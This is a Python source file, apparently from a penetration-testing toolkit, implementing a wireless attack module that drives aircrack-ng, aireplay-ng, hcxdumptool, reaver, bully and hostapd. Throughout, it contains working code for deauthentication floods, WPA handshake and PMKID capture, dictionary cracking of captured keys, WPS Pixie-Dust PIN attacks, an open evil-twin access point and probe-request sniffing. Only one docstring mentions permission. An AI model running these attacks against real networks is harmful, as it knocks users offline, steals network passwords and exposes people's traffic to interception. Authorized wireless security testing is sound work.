"""
Wireless Attack Module
Advanced WiFi reconnaissance, cracking, and attack capabilities
"""

import asyncio
import subprocess
import re
import os
import tempfile
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Tuple
from enum import Enum
from datetime import datetime
import hashlib
import logging

logger = logging.getLogger(__name__)


class SecurityType(Enum):
    """WiFi security types"""
    OPEN = "open"
    WEP = "wep"
    WPA = "wpa"
    WPA2 = "wpa2"
    WPA3 = "wpa3"
    WPA2_ENTERPRISE = "wpa2_enterprise"
    UNKNOWN = "unknown"


class AttackType(Enum):
    """Types of wireless attacks"""
    DEAUTH = "deauth"
    EVIL_TWIN = "evil_twin"
    HANDSHAKE_CAPTURE = "handshake_capture"
    PMKID_CAPTURE = "pmkid_capture"
    WPS_ATTACK = "wps"
    KARMA = "karma"
    BEACON_FLOOD = "beacon_flood"
    PROBE_SNIFF = "probe_sniff"


@dataclass
class AccessPoint:
    """Represents a detected WiFi access point"""
    bssid: str
    essid: str
    channel: int
    signal_strength: int = 0
    security: SecurityType = SecurityType.UNKNOWN
    cipher: str = ""
    auth: str = ""
    speed: int = 0
    first_seen: datetime = field(default_factory=datetime.now)
    last_seen: datetime = field(default_factory=datetime.now)
    clients: List[str] = field(default_factory=list)
    beacons: int = 0
    ivs: int = 0  # For WEP attacks
    wps_enabled: bool = False
    wps_locked: bool = False
    vendor: str = ""
    
    def to_dict(self) -> dict:
        return {
            'bssid': self.bssid,
            'essid': self.essid,
            'channel': self.channel,
            'signal_strength': self.signal_strength,
            'security': self.security.value,
            'cipher': self.cipher,
            'auth': self.auth,
            'speed': self.speed,
            'first_seen': self.first_seen.isoformat(),
            'last_seen': self.last_seen.isoformat(),
            'clients': self.clients,
            'wps_enabled': self.wps_enabled,
            'wps_locked': self.wps_locked,
            'vendor': self.vendor
        }


@dataclass
class Client:
    """Represents a WiFi client"""
    mac: str
    bssid: str = ""  # Associated AP
    signal_strength: int = 0
    packets: int = 0
    probes: List[str] = field(default_factory=list)
    first_seen: datetime = field(default_factory=datetime.now)
    last_seen: datetime = field(default_factory=datetime.now)
    vendor: str = ""


@dataclass
class Handshake:
    """Captured WPA handshake"""
    bssid: str
    essid: str
    client_mac: str
    capture_file: str
    capture_time: datetime = field(default_factory=datetime.now)
    frames_captured: int = 0
    is_complete: bool = False


@dataclass
class WirelessScanResult:
    """Results from wireless scanning"""
    access_points: List[AccessPoint] = field(default_factory=list)
    clients: List[Client] = field(default_factory=list)
    handshakes: List[Handshake] = field(default_factory=list)
    scan_duration: float = 0
    interface: str = ""
    channel: int = 0


class WirelessAttacks:
    """
    Wireless Attack Module
    Provides WiFi reconnaissance, handshake capture, and attack capabilities
    """
    
    # OUI database for vendor lookup (sample)
    OUI_DATABASE = {
        '00:00:0C': 'Cisco',
        '00:1A:2B': 'Hewlett-Packard',
        '00:50:56': 'VMware',
        'AC:DE:48': 'Intel',
        'B8:27:EB': 'Raspberry Pi',
        'DC:A6:32': 'Raspberry Pi',
        '00:0C:29': 'VMware',
        '00:1C:B3': 'Apple',
        '00:03:93': 'Apple',
        '64:A2:F9': 'Apple',
        'F0:18:98': 'Apple',
        '00:26:BB': 'Apple',
        '00:17:88': 'Philips',
        '00:14:22': 'Dell',
        '00:1E:C2': 'Apple',
        '00:1F:5B': 'Apple',
        '94:65:9C': 'Intel',
        'B4:2E:99': 'Logitech',
    }
    
    def __init__(self, config: Optional[Dict] = None):
        self.config = config or {}
        self.interface: Optional[str] = None
        self.monitor_interface: Optional[str] = None
        self.scanning = False
        self.capture_dir = tempfile.mkdtemp(prefix="hydra_wireless_")
        
        # Detected items
        self.access_points: Dict[str, AccessPoint] = {}
        self.clients: Dict[str, Client] = {}
        self.handshakes: List[Handshake] = []
    
    async def get_interfaces(self) -> List[Dict[str, Any]]:
        """Get list of wireless interfaces"""
        interfaces = []
        
        try:
            # Use iwconfig to find wireless interfaces
            result = await asyncio.create_subprocess_exec(
                'iwconfig',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await result.communicate()
            output = stdout.decode()
            
            current_iface = None
            for line in output.split('\n'):
                if line and not line.startswith(' '):
                    parts = line.split()
                    if parts:
                        iface_name = parts[0]
                        if 'IEEE 802.11' in line or 'ESSID' in line:
                            current_iface = {
                                'name': iface_name,
                                'mode': 'managed',
                                'channel': 0,
                                'frequency': '',
                                'essid': ''
                            }
                            
                            # Extract ESSID
                            essid_match = re.search(r'ESSID:"([^"]*)"', line)
                            if essid_match:
                                current_iface['essid'] = essid_match.group(1)
                            
                            interfaces.append(current_iface)
                
                elif current_iface and 'Mode:' in line:
                    mode_match = re.search(r'Mode:(\w+)', line)
                    if mode_match:
                        current_iface['mode'] = mode_match.group(1).lower()
                    
                    freq_match = re.search(r'Frequency:([\d.]+ GHz)', line)
                    if freq_match:
                        current_iface['frequency'] = freq_match.group(1)
            
            # Check for monitor mode interfaces
            result = await asyncio.create_subprocess_exec(
                'iw', 'dev',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await result.communicate()
            output = stdout.decode()
            
            current = None
            for line in output.split('\n'):
                if 'Interface' in line:
                    current = line.split()[-1]
                elif 'type' in line and current:
                    if 'monitor' in line:
                        # Update interface mode if found
                        for iface in interfaces:
                            if iface['name'] == current:
                                iface['mode'] = 'monitor'
                                break
            
        except Exception as e:
            logger.error(f"Error getting interfaces: {e}")
        
        return interfaces
    
    async def enable_monitor_mode(self, interface: str) -> Optional[str]:
        """Enable monitor mode on interface"""
        try:
            # Try airmon-ng first
            result = await asyncio.create_subprocess_exec(
                'airmon-ng', 'check', 'kill',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            await result.communicate()
            
            result = await asyncio.create_subprocess_exec(
                'airmon-ng', 'start', interface,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await result.communicate()
            output = stdout.decode() + stderr.decode()
            
            # Find the monitor interface name
            mon_match = re.search(r'(\w+mon\d*)', output)
            if mon_match:
                self.monitor_interface = mon_match.group(1)
                return self.monitor_interface
            
            # Check if interface is already in monitor mode
            if f'{interface}mon' in output or 'monitor mode' in output.lower():
                self.monitor_interface = f'{interface}mon'
                return self.monitor_interface
            
            # Fallback: use iw
            await asyncio.create_subprocess_exec(
                'ip', 'link', 'set', interface, 'down',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            result = await asyncio.create_subprocess_exec(
                'iw', interface, 'set', 'monitor', 'control',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            await result.communicate()
            
            await asyncio.create_subprocess_exec(
                'ip', 'link', 'set', interface, 'up',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            self.monitor_interface = interface
            return interface
            
        except Exception as e:
            logger.error(f"Error enabling monitor mode: {e}")
            return None
    
    async def disable_monitor_mode(self, interface: str) -> bool:
        """Disable monitor mode"""
        try:
            result = await asyncio.create_subprocess_exec(
                'airmon-ng', 'stop', interface,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            await result.communicate()
            
            self.monitor_interface = None
            return True
            
        except Exception as e:
            logger.error(f"Error disabling monitor mode: {e}")
            return False
    
    async def scan_networks(self, interface: str, 
                            duration: int = 30,
                            channel: int = 0) -> WirelessScanResult:
        """Scan for WiFi networks using airodump-ng"""
        result = WirelessScanResult(interface=interface, channel=channel)
        
        # Create output file prefix
        output_prefix = os.path.join(self.capture_dir, f'scan_{int(datetime.now().timestamp())}')
        
        try:
            cmd = ['airodump-ng', '--write', output_prefix, '--output-format', 'csv']
            
            if channel > 0:
                cmd.extend(['--channel', str(channel)])
            
            cmd.append(interface)
            
            # Start airodump-ng
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            # Let it scan for the specified duration
            await asyncio.sleep(duration)
            
            # Terminate
            process.terminate()
            try:
                await asyncio.wait_for(process.wait(), timeout=5)
            except asyncio.TimeoutError:
                process.kill()
            
            # Parse CSV output
            csv_file = f'{output_prefix}-01.csv'
            if os.path.exists(csv_file):
                result = await self._parse_airodump_csv(csv_file)
                result.interface = interface
                result.channel = channel
                result.scan_duration = duration
            
        except FileNotFoundError:
            logger.error("airodump-ng not found. Install aircrack-ng suite.")
        except Exception as e:
            logger.error(f"Error scanning networks: {e}")
        
        return result
    
    async def _parse_airodump_csv(self, csv_file: str) -> WirelessScanResult:
        """Parse airodump-ng CSV output"""
        result = WirelessScanResult()
        
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Split into AP and client sections
            sections = content.split('\r\n\r\n')
            
            # Parse Access Points
            if len(sections) > 0:
                lines = sections[0].strip().split('\n')
                for line in lines[2:]:  # Skip header
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 14:
                        try:
                            bssid = parts[0]
                            if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid):
                                continue
                            
                            security = self._parse_security(parts[5], parts[6], parts[7])
                            
                            ap = AccessPoint(
                                bssid=bssid,
                                essid=parts[13].strip() if len(parts) > 13 else '',
                                channel=int(parts[3]) if parts[3].strip().isdigit() else 0,
                                signal_strength=int(parts[8]) if parts[8].strip().lstrip('-').isdigit() else 0,
                                security=security,
                                cipher=parts[6].strip(),
                                auth=parts[7].strip(),
                                speed=int(parts[4]) if parts[4].strip().isdigit() else 0,
                                beacons=int(parts[9]) if parts[9].strip().isdigit() else 0,
                                ivs=int(parts[10]) if parts[10].strip().isdigit() else 0,
                                vendor=self._lookup_vendor(bssid)
                            )
                            
                            self.access_points[bssid] = ap
                            result.access_points.append(ap)
                            
                        except (ValueError, IndexError) as e:
                            continue
            
            # Parse Clients
            if len(sections) > 1:
                lines = sections[1].strip().split('\n')
                for line in lines[2:]:  # Skip header
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 6:
                        try:
                            mac = parts[0]
                            if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', mac):
                                continue
                            
                            client = Client(
                                mac=mac,
                                bssid=parts[5] if len(parts) > 5 else '',
                                signal_strength=int(parts[3]) if parts[3].strip().lstrip('-').isdigit() else 0,
                                packets=int(parts[4]) if parts[4].strip().isdigit() else 0,
                                probes=[p.strip() for p in parts[6:] if p.strip()],
                                vendor=self._lookup_vendor(mac)
                            )
                            
                            self.clients[mac] = client
                            result.clients.append(client)
                            
                            # Add to AP's client list
                            if client.bssid in self.access_points:
                                self.access_points[client.bssid].clients.append(mac)
                            
                        except (ValueError, IndexError):
                            continue
            
        except Exception as e:
            logger.error(f"Error parsing CSV: {e}")
        
        return result
    
    def _parse_security(self, enc: str, cipher: str, auth: str) -> SecurityType:
        """Parse security type from airodump fields"""
        enc = enc.upper()
        
        if 'WPA3' in enc or 'SAE' in auth.upper():
            return SecurityType.WPA3
        elif 'WPA2' in enc:
            if 'MGT' in auth.upper() or 'EAP' in auth.upper():
                return SecurityType.WPA2_ENTERPRISE
            return SecurityType.WPA2
        elif 'WPA' in enc:
            return SecurityType.WPA
        elif 'WEP' in enc:
            return SecurityType.WEP
        elif 'OPN' in enc:
            return SecurityType.OPEN
        
        return SecurityType.UNKNOWN
    
    def _lookup_vendor(self, mac: str) -> str:
        """Lookup vendor from MAC OUI"""
        oui = mac[:8].upper()
        return self.OUI_DATABASE.get(oui, 'Unknown')
    
    async def deauth_attack(self, interface: str, 
                            target_bssid: str,
                            client_mac: str = 'FF:FF:FF:FF:FF:FF',
                            packets: int = 100,
                            channel: int = 0) -> bool:
        """
        Send deauthentication packets
        Use responsibly - only on networks you own or have permission to test
        """
        try:
            # Set channel if specified
            if channel > 0:
                await asyncio.create_subprocess_exec(
                    'iwconfig', interface, 'channel', str(channel),
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
            
            cmd = [
                'aireplay-ng',
                '--deauth', str(packets),
                '-a', target_bssid,
            ]
            
            if client_mac != 'FF:FF:FF:FF:FF:FF':
                cmd.extend(['-c', client_mac])
            
            cmd.append(interface)
            
            result = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await result.communicate()
            
            return result.returncode == 0
            
        except Exception as e:
            logger.error(f"Deauth attack error: {e}")
            return False
    
    async def capture_handshake(self, interface: str,
                                 target_bssid: str,
                                 target_essid: str,
                                 channel: int,
                                 timeout: int = 60,
                                 deauth: bool = True) -> Optional[Handshake]:
        """
        Capture WPA/WPA2 4-way handshake
        """
        output_prefix = os.path.join(
            self.capture_dir, 
            f'handshake_{target_bssid.replace(":", "")}_{int(datetime.now().timestamp())}'
        )
        
        try:
            # Start airodump-ng to capture
            capture_cmd = [
                'airodump-ng',
                '--bssid', target_bssid,
                '--channel', str(channel),
                '--write', output_prefix,
                interface
            ]
            
            capture_process = await asyncio.create_subprocess_exec(
                *capture_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            # Wait a moment for capture to start
            await asyncio.sleep(2)
            
            # Send deauth to force reconnection
            if deauth:
                deauth_task = asyncio.create_task(
                    self.deauth_attack(interface, target_bssid, packets=5, channel=channel)
                )
            
            # Wait for handshake or timeout
            cap_file = f'{output_prefix}-01.cap'
            start_time = datetime.now()
            handshake_captured = False
            
            while (datetime.now() - start_time).seconds < timeout:
                await asyncio.sleep(5)
                
                # Check if handshake was captured
                if os.path.exists(cap_file):
                    check_result = await asyncio.create_subprocess_exec(
                        'aircrack-ng', cap_file,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE
                    )
                    stdout, _ = await check_result.communicate()
                    
                    if '1 handshake' in stdout.decode().lower():
                        handshake_captured = True
                        break
                
                # Send more deauths periodically
                if deauth and (datetime.now() - start_time).seconds % 15 == 0:
                    await self.deauth_attack(interface, target_bssid, packets=3, channel=channel)
            
            # Stop capture
            capture_process.terminate()
            try:
                await asyncio.wait_for(capture_process.wait(), timeout=5)
            except asyncio.TimeoutError:
                capture_process.kill()
            
            if handshake_captured:
                handshake = Handshake(
                    bssid=target_bssid,
                    essid=target_essid,
                    client_mac='',
                    capture_file=cap_file,
                    is_complete=True
                )
                self.handshakes.append(handshake)
                return handshake
            
        except Exception as e:
            logger.error(f"Handshake capture error: {e}")
        
        return None
    
    async def capture_pmkid(self, interface: str,
                            target_bssid: str,
                            channel: int,
                            timeout: int = 30) -> Optional[str]:
        """
        Capture PMKID for hashcat cracking
        Faster than full handshake capture
        """
        output_file = os.path.join(
            self.capture_dir,
            f'pmkid_{target_bssid.replace(":", "")}_{int(datetime.now().timestamp())}.pcapng'
        )
        
        try:
            # Use hcxdumptool for PMKID capture
            cmd = [
                'hcxdumptool',
                '-i', interface,
                '-o', output_file,
                '--filterlist_ap', target_bssid.replace(':', ''),
                '--filtermode=2',
                '-c', str(channel)
            ]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            await asyncio.sleep(timeout)
            process.terminate()
            
            if os.path.exists(output_file):
                # Convert to hashcat format
                hash_file = output_file.replace('.pcapng', '.22000')
                convert_result = await asyncio.create_subprocess_exec(
                    'hcxpcapngtool', '-o', hash_file, output_file,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                await convert_result.communicate()
                
                if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
                    return hash_file
            
        except FileNotFoundError:
            logger.error("hcxdumptool not found. Install hcxtools.")
        except Exception as e:
            logger.error(f"PMKID capture error: {e}")
        
        return None
    
    async def crack_handshake(self, capture_file: str,
                               wordlist: str,
                               essid: str = '') -> Optional[str]:
        """
        Crack WPA handshake using aircrack-ng
        """
        try:
            cmd = ['aircrack-ng', '-w', wordlist]
            
            if essid:
                cmd.extend(['-e', essid])
            
            cmd.append(capture_file)
            
            result = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, _ = await result.communicate()
            output = stdout.decode()
            
            # Parse for found key
            key_match = re.search(r'KEY FOUND!\s*\[\s*(.+?)\s*\]', output)
            if key_match:
                return key_match.group(1)
            
        except Exception as e:
            logger.error(f"Cracking error: {e}")
        
        return None
    
    async def wps_attack(self, interface: str,
                          target_bssid: str,
                          method: str = 'reaver') -> Optional[str]:
        """
        WPS PIN attack using reaver or bully
        """
        try:
            if method == 'reaver':
                cmd = [
                    'reaver',
                    '-i', interface,
                    '-b', target_bssid,
                    '-vv',
                    '-K', '1',  # Pixie-Dust attack
                    '-N'  # Don't send NACK
                ]
            else:
                cmd = [
                    'bully',
                    '-b', target_bssid,
                    '-d',
                    '-v', '3',
                    interface
                ]
            
            result = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, _ = await result.communicate()
            output = stdout.decode()
            
            # Look for WPA PSK in output
            psk_match = re.search(r'WPA PSK:\s*[\'"]?(.+?)[\'"]?\s*$', output, re.MULTILINE)
            if psk_match:
                return psk_match.group(1)
            
            pin_match = re.search(r'WPS PIN:\s*[\'"]?(\d+)[\'"]?', output)
            if pin_match:
                return f"PIN:{pin_match.group(1)}"
            
        except Exception as e:
            logger.error(f"WPS attack error: {e}")
        
        return None
    
    async def create_evil_twin(self, interface: str,
                                target_essid: str,
                                channel: int,
                                gateway: str = '192.168.1.1') -> bool:
        """
        Create an Evil Twin access point
        Requires hostapd and dnsmasq
        """
        try:
            # Create hostapd config
            hostapd_conf = f"""
interface={interface}
driver=nl80211
ssid={target_essid}
hw_mode=g
channel={channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
"""
            
            conf_file = os.path.join(self.capture_dir, 'hostapd.conf')
            with open(conf_file, 'w') as f:
                f.write(hostapd_conf)
            
            # Configure interface
            await asyncio.create_subprocess_exec(
                'ip', 'addr', 'add', f'{gateway}/24', 'dev', interface,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            # Start hostapd
            hostapd_proc = await asyncio.create_subprocess_exec(
                'hostapd', conf_file,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            return True
            
        except Exception as e:
            logger.error(f"Evil Twin error: {e}")
            return False
    
    async def probe_request_sniff(self, interface: str,
                                   duration: int = 60) -> List[Dict[str, Any]]:
        """
        Sniff probe requests to find SSIDs devices are looking for
        """
        probes = []
        
        try:
            # Use tcpdump to capture probe requests
            output_file = os.path.join(self.capture_dir, f'probes_{int(datetime.now().timestamp())}.pcap')
            
            cmd = [
                'tcpdump',
                '-i', interface,
                '-w', output_file,
                'type mgt subtype probe-req'
            ]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            await asyncio.sleep(duration)
            process.terminate()
            
            # Parse with tshark
            if os.path.exists(output_file):
                parse_cmd = [
                    'tshark',
                    '-r', output_file,
                    '-T', 'fields',
                    '-e', 'wlan.sa',
                    '-e', 'wlan_mgt.ssid'
                ]
                
                result = await asyncio.create_subprocess_exec(
                    *parse_cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                
                stdout, _ = await result.communicate()
                
                for line in stdout.decode().strip().split('\n'):
                    if '\t' in line:
                        parts = line.split('\t')
                        if len(parts) >= 2 and parts[1]:
                            probes.append({
                                'client_mac': parts[0],
                                'ssid': parts[1],
                                'vendor': self._lookup_vendor(parts[0])
                            })
            
        except Exception as e:
            logger.error(f"Probe sniffing error: {e}")
        
        return probes
    
    def get_scan_summary(self) -> Dict[str, Any]:
        """Get summary of all scanned data"""
        security_counts = {}
        for ap in self.access_points.values():
            sec = ap.security.value
            security_counts[sec] = security_counts.get(sec, 0) + 1
        
        return {
            'total_aps': len(self.access_points),
            'total_clients': len(self.clients),
            'handshakes_captured': len(self.handshakes),
            'security_breakdown': security_counts,
            'wps_enabled': sum(1 for ap in self.access_points.values() if ap.wps_enabled),
            'hidden_networks': sum(1 for ap in self.access_points.values() if not ap.essid),
        }
    
    def cleanup(self):
        """Clean up temporary files"""
        import shutil
        try:
            shutil.rmtree(self.capture_dir)
        except Exception:
            pass
